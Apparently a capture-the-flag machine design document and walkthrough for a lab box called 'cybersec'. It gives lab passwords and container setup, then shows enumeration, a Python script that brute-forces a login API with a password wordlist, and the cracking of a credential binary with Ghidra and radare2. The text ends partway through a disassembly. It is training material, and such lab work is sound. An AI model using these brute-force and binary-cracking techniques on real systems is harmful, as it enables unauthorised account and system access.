# cybersec

## Introduction

I created this machine with the intention of highlighting the Bof vulnerability, even when all protections are active, but it is combined with bad configurations as well as the power of reverse engineering and cracking. In addition, I also want to highlight the importance of having critical endpoints that could expose sensitive information well secured.

## Info for HTB

### Access

Passwords:

| User   | Password                            |
| -----  | ----------------------------------- |
| carlos |  deephack009|
| pedro  |  12369874qwertyuiop|
| root   |  pQcp0mvmered11100011pass|

### Key Processes

The web service is set up with Flask, the path to the `.py` file is:

```/opt/cybersecurity_company/app.py```

The other service present on the machine is `SSH`, which runs with 

```sudo service ssh start```

For the `hall` and `sec2pass` binaries I send the source codes separately.

### Automation / Crons

wrapper of gdb: `/usr/local/bin/secure_gdb`

```bash
#!/bin/bash
bin_path="/home/darks/Desktop/bof/bof_para_dockerlabs/full/binariox"
hash="63b18851aa3667a90b675ca6a58a1690322a0f46d242388d3b8527a05c88cfb8"

# validamos que solo se le pase un argumento al script, el cual debe ser unica y exclusivamente la ruta al binario
if [[ $# -ne 1 ]]; then
    echo "Error: Solo se permite un argumento (la ruta al binario)."
    exit 1
fi

# Validamos que solo se ejecuta el binario permitido
if [[ "$1" != $bin_path ]]; then
    echo "Permiso denegado: solo puedes depurar el binario $bin_path"
    exit 1
fi

# Validamos el hash del binario, sino coinciden, entonces abortamos la ejecucion (validacion agregada por si acaso)
validator=$(sha256sum "$1" |awk '{print $1}') # extraemos el hash del binario que se pasa como argumento

if [[ "$hash" != "$validator" ]]; then # comparamos los hashes, el calculado en tiempo de ejecucion con el hash previamente calculado, deben coincidir si o si...
   echo "Binario modificado, abortando ejecucion" # si llega a ser modificado, entonces lo detectamos y abortamos la operacion...
   echo "Notificando del Evento al administrador del Sistema!"
   echo 'Se Detecto la modificacion del binario [/home/darks/Desktop/bof/bof_para_dockerlabs/full/binariox]' >> /root/Events.log
   sleep 2
   echo 'Notificacion enviada... !Termino la Ejecucion!'
   exit 1
fi

# si se pasan todas las comprobaciones de seguridad con exito, entonces ejecutamos el binario ya que es seguro depurar unica y excusivamente el binario objetivo
/usr/bin/gdb -nx -x /root/.gdbinit "$@"

```

Initialization file for `gdb` : `/root/.gdbinit`

```
set confirm off

define shell
  echo "El uso del comando 'shell' está deshabilitado.\n"
end
```

The `gdb` wrapper is responsible for wrapping gdb to secure its execution with `sudo` and thus, along with the `/root/.gdbinit` configuration file, prevent direct escalation to root without having to exploit the `bof`.


### Firewall Rules

sin rules

### Docker

Dockerfile

```
FROM cybersec:latest

CMD service ssh start && \
    setsid python3 /opt/cybersecurity_company/app.py \
    tail -f /dev/null
```

I have also created a script to automate the execution and subsequent cleaning of the image in the system.

run_cybersec.sh
```bash
#!/bin/bash
# autor: darksblack
# Color
CBL='\033[34m'  # blue
CBLE='\033[36m' # Cyan
BLD='\033[1m'   # Bold type
CNC='\033[0m'   # Reset color
# banner
printf "\t ${CBL}${BLD} \n"
printf "\t       ____      _               ____\n"
printf "\t      / ___|   _| |__   ___ _ __/ ___|  ___  ___\n"
printf "\t     | |  | | | |  _ \ / _ \  __\___ \ / _ \/ __|\n"
printf "\t     | |__| |_| | |_) |  __/ |   ___) |  __/ (__\n"
printf "\t      \____\__, |_.__/ \___|_|  |____/ \___|\___|\n"
printf "\t           |___/\n"
printf "\t ${CNC} \n"

name="cybersec"

stop_del() {

    docker rm -f $name > /dev/null 2>&1 # we remove the docker container
    docker rmi -f $name > /dev/null 2>&1 # We remove the docker image
}


trap ctrl_c SIGINT

function ctrl_c() {
    echo -e "\e[1mDeleting the lab, wait a moment...\e[0m"
    stop_del
    echo -e "\nThe lab has been completely removed from the system."
    exit 0
}

# load the Docker image
docker load -i cybersec.tar > /dev/null

# we run the container
docker run --name $name -d --security-opt seccomp=unconfined --hostname $name -it $name >/dev/null

# --security-opt seccomp=unconfined: It is implemented to be able to make system calls, such as execve, which is necessary to exploit bof.
# Docker containers block this by default

# we extract the IP address of the container.
IP_ADDRESS=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $name)

printf "${CBLE}${BLD}\n"
echo "Machine deployed, its IP address is -->" $IP_ADDRESS
printf "\t ${CNC} \n"

# Wait indefinitely so that the script does not terminate.
while true; do
    sleep 1
done
```
If you are not using the previous script, it is important to run the container with the `--security-opt seccomp=unconfined` parameters, as this is essential for performing the Bof exploitation in the `hall` binary. This is because Docker containers block system calls by default, and the Bof exploitation uses the `execve` system call to invoke a `shell` and thus obtain `root`.




### Other

[Include any other design decisions you made that the HTB staff should know about]



# Writeup

The process of acquiring the machine begins by analyzing the website for endpoints. Upon locating the appropriate endpoint, a directional attack is necessary with default users such as administrator or admin. Once the API is compromised, sensitive information is extracted, giving us access to subdomains. Among the subdomains, we find a binary and a note. This binary is still being developed but has apparently valid credentials, as the objective of said binary appears to be to manage employee credentials. It is through this binary that access to the machine is gained, as it must be cracked to bypass validations. What is done before printing the credentials, once inside the system, there is a user who can execute the exim binary as another system user. This binary allows for arbitrary command execution. To do this, it is necessary to read the documentation in detail, as it indicates how to do so. After exploiting the exim binary and reaching the second and last user on the system, to escalate to root, we will face a binary vulnerable to bof and that has all protections activated. Therefore, to reach root, an advanced form of exploitation will be necessary.

# Enumeration

## Enumeration of Ports, Services and Versions

```bash
sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-12 17:41 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 e2:19:31:9c:00:59:d0:0f:10:e4:05:a9:0f:82:d2:37 (ECDSA)
|_  256 32:40:20:46:bf:c3:d2:b2:15:fc:a3:10:1e:ab:b8:fd (ED25519)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Did not follow redirect to http://cybersec.htb
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

We see that the `SSH` and `HTTP` services are running, so we'll start by checking the web service, but first we must add the domain reported by `nmap` to the `/etc/hosts` file.

```bash
echo "172.17.0.2 cybersec.htb" >> /etc/hosts
```
Now we can consult the web service

![image](https://github.com/user-attachments/assets/d3951830-49b0-47e2-a78e-27984d1931b5)

It seems to be about a cybersecurity company. If we test the contact panel, it has nothing to offer. If we check the source code, we can see some interesting information.

![image](https://github.com/user-attachments/assets/cb06b947-6249-49ce-907f-5b80ee138581)

uses an `api` to generate the secure credentials message, we check 

![image](https://github.com/user-attachments/assets/3e881c99-33e0-4133-804d-72f41ac8ddd7)

I'll see if I can get more endpoints by fuzzing.

```bash
feroxbuster -u http://cybersec.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cybersec.htb/api
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://cybersec.htb/api/login
[>-------------------] - 11s     8768/2491548 52m     found:1       errors:19     
[>-------------------] - 11s     7776/2491548 707/s   http://cybersec.htb/api/ 
```

I get one more end point, so we can test it.

![image](https://github.com/user-attachments/assets/cca134ee-fc2e-4928-8041-e31b34441888)

We see that it tells us "Method not allowed" so it must be `POST` so I try with `curl`

```bash
curl -X POST http://cybersec.htb/api/login
```
```bash
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```
We notice that it expects `Content-Type: application/json` so it also expects credentials so I continue testing

```bash
curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "1234"}'
```
```bash
{
  "message": "Invalid credentials"
}
```
Now that I have this foundation, I'll perform a dictionary attack using default users like admin or administrator... For this, I'll develop a Python script, but first, I'll create a word list with the users.

```bash
echo "admin" > users.txt && echo "administrator" >> users.txt
```

brute-force-api.py
```python
import requests
import json

# URL de la API
url = 'http://cybersec.htb/api/login'

# Función para leer una wordlist desde un archivo
def leer_wordlist(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        return [line.strip() for line in file]

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(usernames, passwords):
    headers = {
        'Content-Type': 'application/json'
    }
    for username in usernames:
        for password in passwords:
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, headers=headers, data=json.dumps(data))

            # Verificar si la respuesta indica un inicio de sesión exitoso
            if 'success' in response.text:
                print(f'[+] ¡Credenciales encontradas! Usuario: {username}, Contraseña: {password}')
                return
            else:
                print(f'[-] Fallido: Usuario: {username}, Contraseña: {password}')

    print('[-] No se encontraron credenciales válidas.')

# Especificar las rutas de las wordlists
usernames_file = 'users.txt'
passwords_file = '/usr/share/wordlists/rockyou.txt'

# Leer las wordlists
usernames = leer_wordlist(usernames_file)
passwords = leer_wordlist(passwords_file)

# Ejecutar el ataque de fuerza bruta
brute_force_attack(usernames, passwords)
```

run the script

```bash
python3 brute-force-api.py
```

```bash
.
.
.
.
[-] Fallido: Usuario: admin, Contraseña: daddy
[-] Fallido: Usuario: admin, Contraseña: catdog
[-] Fallido: Usuario: admin, Contraseña: armando
[-] Fallido: Usuario: admin, Contraseña: margarita
[-] Fallido: Usuario: admin, Contraseña: 151515
[-] Fallido: Usuario: admin, Contraseña: loves
[-] Fallido: Usuario: admin, Contraseña: lolita
[-] Fallido: Usuario: admin, Contraseña: 202020
[-] Fallido: Usuario: admin, Contraseña: gerard
[+] ¡Credenciales encontradas! Usuario: admin, Contraseña: undertaker
```
Now with the credentials obtained I can authenticate against the `api` using `curl` again.

```bash
curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "undertaker"}'
```
```bash
{
  "company": {
    "URLs_web": "cybersec.htb, bin.cybersec.htb, mail.cybersec.htb, dev.cybersec.htb, cybersec.htb/downloads, internal-api.cybersec.htb, 0internal_down.cybersec.htb, internal.cybersec.htb, cybersec.htb/documents, cybersec.htb/api/cpu, cybersec.htb/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```
Apparently, it returns company information, such as its address, clients, branches, and the services it provides. But the most important thing for us are the URLs linked to the company, so we focused on them for testing. We added the subdomains to the `/etc/hosts` file, and after testing the subdomains, only two of them were active.

![image](https://github.com/user-attachments/assets/cd6a03b4-d59f-4626-bb32-0860ee7f5820)

active URLs: `http://mail.cybersec.htb/` & `http://0internal_down.cybersec.htb/`

After testing the email subdomain, I couldn't find any vulnerabilities, so we checked the other active subdomain where we saw two files. I downloaded the `.txt` file and saw that it had the following information:

```bash
At Cybersec we are committed to information security, for this reason we have developed a program so that our associates 
do not have to remember credentials, it is currently in beta phase, so not all credentials are stored yet, but in the 
short term improvements will be included and credentials of more associates will be added... Our program, Sec2Pass, 
has 3 levels of security to protect internal credentials, and to avoid information leakage, the authentication credentials 
to access internal credentials are automatically updated every 24 hours, for this reason it will be mandatory to request the 
primary credentials when arriving at the company where they will be given the first access password as well as an additional 
security ping and in this way, Sec2Pass will provide them with the remote access credentials necessary to perform their functions.
```

We see that the note talks about the second file "Sec2Pass" which turns out to be a binary and from what the note says it contains credentials so it downloads and examines it

![image](https://github.com/user-attachments/assets/95757894-f200-43c4-9fa9-298b466884f1)

Since I don't have the password to access the program's information, I'll reverse engineer it to see if I can extract the credentials it has.

# Foothold

## Reverse Engineering & cracking

### GHIDRA

I start by opening the program with Ghidra to try to extract information.

```bash
ghidra 
```

![image](https://github.com/user-attachments/assets/680651eb-199c-4bdf-9d0a-197db57adedd)

We load the program and begin its analysis

![image](https://github.com/user-attachments/assets/2f0e8aff-f5c2-45d8-999d-0a2742ed0e91)

After some analysis, I notice that encryption is applied with `AES-256`, and I notice that the `qw3e7t()` function is responsible for decryption. Trying to decrypt the information would be a very complex process, so I go to the `main()` function to see which function is called after successful validation of the credentials.

![image](https://github.com/user-attachments/assets/410d463d-4188-47d5-9f06-ae516eb48b8a)

the `k8j4h3()` function is called so I will try to crack the binary to skip the validation and call the `k8j4h3()` function at the beginning of `main()`

### Cracking

To crack the binary we will use `radare2`

```bash
r2 -w sec2pass
```
```
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00001130]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00001130]> s main
[0x00001865]> pdf
Do you want to print 364 lines? (y/N) y
            ; ICOD XREF from entry0 @ 0x1144(r)
┌ 1727: int main (int argc, char **argv, char **envp);
│ afv: vars(7:sp[0x10..0x10f8])
│           0x00001865      55             push rbp
│           0x00001866      4889e5         mov rbp, rsp
│           0x00001869      4881ecf010..   sub rsp, sym.imp.puts       ; 0x10f0
│           0x00001870      64488b0425..   mov rax, qword fs:[0x28]
│           0x00001879      488945f8       mov qword [canary], rax
│           0x0000187d      31c0           xor eax, eax
│           0x0000187f      488d95f0ef..   lea rdx, [format]
│           0x00001886      b800000000     mov eax, 0
│           0x0000188b      b980000000     mov ecx, 0x80
│           0x00001890      4889d7         mov rdi, rdx
│           0x00001893      f348ab         rep stosq qword [rdi], rax
│           0x00001896      488b15ab28..   mov rdx, qword [obj.AMLP]   ; [0x4148:8]=0x21b5
│           0x0000189d      488d85f0ef..   lea rax, [format]
│           0x000018a4      4889d6         mov rsi, rdx                ; const char *s2
│           0x000018a7      4889c7         mov rdi, rax                ; char *s1
│           0x000018aa      e851f8ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000018af      488b159a28..   mov rdx, qword [obj.PRZS]   ; [0x4150:8]=0x21b9
│           0x000018b6      488d85f0ef..   lea rax, [format]
│           0x000018bd      4889d6         mov rsi, rdx                ; const char *s2
│           0x000018c0      4889c7         mov rdi, rax                ; char *s1
│           0x000018c3      e838f8ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000018c8      488b158928..   mov rdx, qword [obj.ING]    ; [0x4158:8]=0x21bd
│           0x000018cf      488d85f0ef..   lea rax, [format]
│           0x000018d6      4889d6         mov rsi, rdx                ; const char *s2
│           0x000018d9      4889c7         mov rdi, rax                ; char *s1
│           0x000018dc      e81ff8ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000018e1      488d85f0ef..   lea rax, [format]
│           0x000018e8      4889c7         mov rdi, rax                ; const char *s
│           0x000018eb      e870f7ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x000018f0      4889c2         mov rdx, rax
│           0x000018f3      488d85f0ef..   lea rax, [format]
│           0x000018fa      4801d0         add rax, rdx
│           0x000018fd      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001902      488b155728..   mov rdx, qword [obj.PROS]   ; [0x4160:8]=0x21bf "la"
│           0x00001909      488d85f0ef..   lea rax, [format]
│           0x00001910      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001913      4889c7         mov rdi, rax                ; char *s1
│           0x00001916      e8e5f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000191b      488d85f0ef..   lea rax, [format]
│           0x00001922      4889c7         mov rdi, rax                ; const char *s
│           0x00001925      e836f7ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000192a      4889c2         mov rdx, rax
│           0x0000192d      488d85f0ef..   lea rax, [format]
│           0x00001934      4801d0         add rax, rdx
│           0x00001937      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000193c      488b152528..   mov rdx, qword [obj.TANO]   ; [0x4168:8]=0x21c2
│           0x00001943      488d85f0ef..   lea rax, [format]
│           0x0000194a      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000194d      4889c7         mov rdi, rax                ; char *s1
│           0x00001950      e8abf7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001955      488b151428..   mov rdx, qword [obj.CHZ]    ; [0x4170:8]=0x21c5
│           0x0000195c      488d85f0ef..   lea rax, [format]
│           0x00001963      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001966      4889c7         mov rdi, rax                ; char *s1
│           0x00001969      e892f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000196e      488b150328..   mov rdx, qword [obj.PWD]    ; [0x4178:8]=0x21c7 "tra"
│           0x00001975      488d85f0ef..   lea rax, [format]
│           0x0000197c      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000197f      4889c7         mov rdi, rax                ; char *s1
│           0x00001982      e879f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001987      488b15f227..   mov rdx, qword [obj.CLIK]   ; [0x4180:8]=0x21cb "se.."
│           0x0000198e      488d85f0ef..   lea rax, [format]
│           0x00001995      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001998      4889c7         mov rdi, rax                ; char *s1
│           0x0000199b      e860f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000019a0      488b15e127..   mov rdx, qword [obj.PARR]   ; [0x4188:8]=0x21d0
│           0x000019a7      488d85f0ef..   lea rax, [format]
│           0x000019ae      4889d6         mov rsi, rdx                ; const char *s2
│           0x000019b1      4889c7         mov rdi, rax                ; char *s1
│           0x000019b4      e847f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000019b9      488d95f0f3..   lea rdx, [s]
│           0x000019c0      b800000000     mov eax, 0
│           0x000019c5      b980000000     mov ecx, 0x80
│           0x000019ca      4889d7         mov rdi, rdx
│           0x000019cd      f348ab         rep stosq qword [rdi], rax
│           0x000019d0      488b159127..   mov rdx, qword [obj.TANO]   ; [0x4168:8]=0x21c2
│           0x000019d7      488d85f0f3..   lea rax, [s]
│           0x000019de      4889d6         mov rsi, rdx                ; const char *s2
│           0x000019e1      4889c7         mov rdi, rax                ; char *s1
│           0x000019e4      e817f7ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000019e9      488b158027..   mov rdx, qword [obj.CHZ]    ; [0x4170:8]=0x21c5
│           0x000019f0      488d85f0f3..   lea rax, [s]
│           0x000019f7      4889d6         mov rsi, rdx                ; const char *s2
│           0x000019fa      4889c7         mov rdi, rax                ; char *s1
│           0x000019fd      e8fef6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001a02      488b156f27..   mov rdx, qword [obj.PWD]    ; [0x4178:8]=0x21c7 "tra"
│           0x00001a09      488d85f0f3..   lea rax, [s]
│           0x00001a10      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001a13      4889c7         mov rdi, rax                ; char *s1
│           0x00001a16      e8e5f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001a1b      488b155e27..   mov rdx, qword [obj.CLIK]   ; [0x4180:8]=0x21cb "se.."
│           0x00001a22      488d85f0f3..   lea rax, [s]
│           0x00001a29      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001a2c      4889c7         mov rdi, rax                ; char *s1
│           0x00001a2f      e8ccf6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001a34      488b15bd27..   mov rdx, qword [obj.ASMLF]  ; [0x41f8:8]=0x2200
│           0x00001a3b      488d85f0f3..   lea rax, [s]
│           0x00001a42      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001a45      4889c7         mov rdi, rax                ; char *s1
│           0x00001a48      e8b3f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001a4d      488d85f0f3..   lea rax, [s]
│           0x00001a54      4889c7         mov rdi, rax                ; const char *s
│           0x00001a57      e804f6ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001a5c      4889c2         mov rdx, rax
│           0x00001a5f      488d85f0f3..   lea rax, [s]
│           0x00001a66      4801d0         add rax, rdx
│           0x00001a69      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001a6e      488b151b27..   mov rdx, qword [obj.VNZ]    ; [0x4190:8]=0x21d4
│           0x00001a75      488d85f0f3..   lea rax, [s]
│           0x00001a7c      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001a7f      4889c7         mov rdi, rax                ; char *s1
│           0x00001a82      e879f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001a87      488b150a27..   mov rdx, qword [obj.HK]     ; [0x4198:8]=0x21d6 str.ncor
│           0x00001a8e      488d85f0f3..   lea rax, [s]
│           0x00001a95      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001a98      4889c7         mov rdi, rax                ; char *s1
│           0x00001a9b      e860f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001aa0      488b15f926..   mov rdx, qword [obj.EEUU]   ; [0x41a0:8]=0x21db "re"
│           0x00001aa7      488d85f0f3..   lea rax, [s]
│           0x00001aae      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001ab1      4889c7         mov rdi, rax                ; char *s1
│           0x00001ab4      e847f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001ab9      488b15e826..   mov rdx, qword [obj.DNMC]   ; [0x41a8:8]=0x21de "cta"
│           0x00001ac0      488d85f0f3..   lea rax, [s]
│           0x00001ac7      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001aca      4889c7         mov rdi, rax                ; char *s1
│           0x00001acd      e82ef6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001ad2      488b150f27..   mov rdx, qword [obj.ERTG]   ; [0x41e8:8]=0x21fc
│           0x00001ad9      488d85f0f3..   lea rax, [s]
│           0x00001ae0      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001ae3      4889c7         mov rdi, rax                ; char *s1
│           0x00001ae6      e815f6ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001aeb      488d95f0f7..   lea rdx, [var_810h]
│           0x00001af2      b800000000     mov eax, 0
│           0x00001af7      b980000000     mov ecx, 0x80
│           0x00001afc      4889d7         mov rdi, rdx
│           0x00001aff      f348ab         rep stosq qword [rdi], rax
│           0x00001b02      488b153f26..   mov rdx, qword [obj.AMLP]   ; [0x4148:8]=0x21b5
│           0x00001b09      488d85f0f7..   lea rax, [var_810h]
│           0x00001b10      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001b13      4889c7         mov rdi, rax                ; char *s1
│           0x00001b16      e8e5f5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001b1b      488b152e26..   mov rdx, qword [obj.PRZS]   ; [0x4150:8]=0x21b9
│           0x00001b22      488d85f0f7..   lea rax, [var_810h]
│           0x00001b29      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001b2c      4889c7         mov rdi, rax                ; char *s1
│           0x00001b2f      e8ccf5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001b34      488b151d26..   mov rdx, qword [obj.ING]    ; [0x4158:8]=0x21bd
│           0x00001b3b      488d85f0f7..   lea rax, [var_810h]
│           0x00001b42      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001b45      4889c7         mov rdi, rax                ; char *s1
│           0x00001b48      e8b3f5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001b4d      488d85f0f7..   lea rax, [var_810h]
│           0x00001b54      4889c7         mov rdi, rax                ; const char *s
│           0x00001b57      e804f5ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001b5c      4889c2         mov rdx, rax
│           0x00001b5f      488d85f0f7..   lea rax, [var_810h]
│           0x00001b66      4801d0         add rax, rdx
│           0x00001b69      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001b6e      488b158b26..   mov rdx, qword [obj.ASMQ]   ; [0x4200:8]=0x2202 "el"
│           0x00001b75      488d85f0f7..   lea rax, [var_810h]
│           0x00001b7c      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001b7f      4889c7         mov rdi, rax                ; char *s1
│           0x00001b82      e879f5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001b87      488d85f0f7..   lea rax, [var_810h]
│           0x00001b8e      4889c7         mov rdi, rax                ; const char *s
│           0x00001b91      e8caf4ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001b96      4889c2         mov rdx, rax
│           0x00001b99      488d85f0f7..   lea rax, [var_810h]
│           0x00001ba0      4801d0         add rax, rdx
│           0x00001ba3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001ba8      488b150126..   mov rdx, qword [obj.NRG]    ; [0x41b0:8]=0x21e2 "cod"
│           0x00001baf      488d85f0f7..   lea rax, [var_810h]
│           0x00001bb6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001bb9      4889c7         mov rdi, rax                ; char *s1
│           0x00001bbc      e83ff5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001bc1      488b15f025..   mov rdx, qword [obj.BRZL]   ; [0x41b8:8]=0x21e6 "igo"
│           0x00001bc8      488d85f0f7..   lea rax, [var_810h]
│           0x00001bcf      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001bd2      4889c7         mov rdi, rax                ; char *s1
│           0x00001bd5      e826f5ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001bda      488d85f0f7..   lea rax, [var_810h]
│           0x00001be1      4889c7         mov rdi, rax                ; const char *s
│           0x00001be4      e877f4ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001be9      4889c2         mov rdx, rax
│           0x00001bec      488d85f0f7..   lea rax, [var_810h]
│           0x00001bf3      4801d0         add rax, rdx
│           0x00001bf6      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001bfb      488b15be25..   mov rdx, qword [obj.LAKDF]  ; [0x41c0:8]=0x21ea "de"
│           0x00001c02      488d85f0f7..   lea rax, [var_810h]
│           0x00001c09      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001c0c      4889c7         mov rdi, rax                ; char *s1
│           0x00001c0f      e8ecf4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001c14      488d85f0f7..   lea rax, [var_810h]
│           0x00001c1b      4889c7         mov rdi, rax                ; const char *s
│           0x00001c1e      e83df4ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001c23      4889c2         mov rdx, rax
│           0x00001c26      488d85f0f7..   lea rax, [var_810h]
│           0x00001c2d      4801d0         add rax, rdx
│           0x00001c30      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001c35      488b158c25..   mov rdx, qword [obj.WVWVEB] ; [0x41c8:8]=0x21ed "seg"
│           0x00001c3c      488d85f0f7..   lea rax, [var_810h]
│           0x00001c43      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001c46      4889c7         mov rdi, rax                ; char *s1
│           0x00001c49      e8b2f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001c4e      488b157b25..   mov rdx, qword [obj.RBWRTB] ; [0x41d0:8]=0x21f1 "uri"
│           0x00001c55      488d85f0f7..   lea rax, [var_810h]
│           0x00001c5c      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001c5f      4889c7         mov rdi, rax                ; char *s1
│           0x00001c62      e899f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001c67      488b156a25..   mov rdx, qword [obj.AEBDV]  ; [0x41d8:8]=0x21f5 "dad"
│           0x00001c6e      488d85f0f7..   lea rax, [var_810h]
│           0x00001c75      4889d6         mov rsi, rdx                ; const char *s2
